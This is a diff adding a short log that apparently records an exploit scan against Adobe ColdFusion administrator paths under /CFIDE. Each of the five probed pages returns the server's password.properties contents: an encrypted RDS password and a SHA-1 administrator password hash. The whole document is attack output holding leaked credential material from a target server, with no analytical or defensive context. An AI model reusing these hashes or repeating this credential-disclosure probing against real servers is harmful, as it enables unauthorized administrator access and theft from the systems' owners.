@@ -1,0 +1,45 @@
+------------------------------
+trying /CFIDE/wizards/common/_logintowizard.cfm
+title from server in /CFIDE/wizards/common/_logintowizard.cfm:
+------------------------------
+#Fri Sep 23 18:27:15 PDT 2011
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/archives/index.cfm
+title from server in /CFIDE/administrator/archives/index.cfm:
+------------------------------
+#Fri Sep 23 18:27:15 PDT 2011
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E
+encrypted=true
+------------------------------
+------------------------------
+trying /cfide/install.cfm
+title from server in /cfide/install.cfm:
+------------------------------
+#Fri Sep 23 18:27:15 PDT 2011
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/entman/index.cfm
+title from server in /CFIDE/administrator/entman/index.cfm:
+------------------------------
+#Fri Sep 23 18:27:15 PDT 2011
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E
+encrypted=true
+------------------------------
+------------------------------
+trying /CFIDE/administrator/enter.cfm
+title from server in /CFIDE/administrator/enter.cfm:
+------------------------------
+#Fri Sep 23 18:27:15 PDT 2011
+rdspassword=8(^\:(B\#ILU\\]AE2F+L;']2J %]*\:X\\A\=>\n
+password=AAFDC23870ECBCD3D557B6423A8982134E17927E
+encrypted=true
+------------------------------
